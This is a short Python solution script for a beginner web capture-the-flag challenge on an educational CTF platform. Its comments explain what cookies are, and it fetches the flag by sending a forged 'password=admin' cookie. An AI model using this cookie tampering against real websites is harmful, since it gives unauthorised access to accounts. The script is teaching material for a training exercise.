#!/usr/bin/env python3

# This CTF is about cookies. Cookies are basically pieces of data
# Websites send cookies to your browser to identify you and remember
# your preferences.
#They can help improve the browsing experience and make website more useful.
# However they can also be used for tracking and advertising, which may impact your privacy.
# In this ctf we'll send the string admin the cookie called "password"

import requests

def main():
    cookies = {'password':'admin'}
    url = "http://web-05.challs.olicyber.it/flag"
    r = requests.get(url,cookies=cookies)
    print(r.text)

if __name__ == "__main__":
    main()
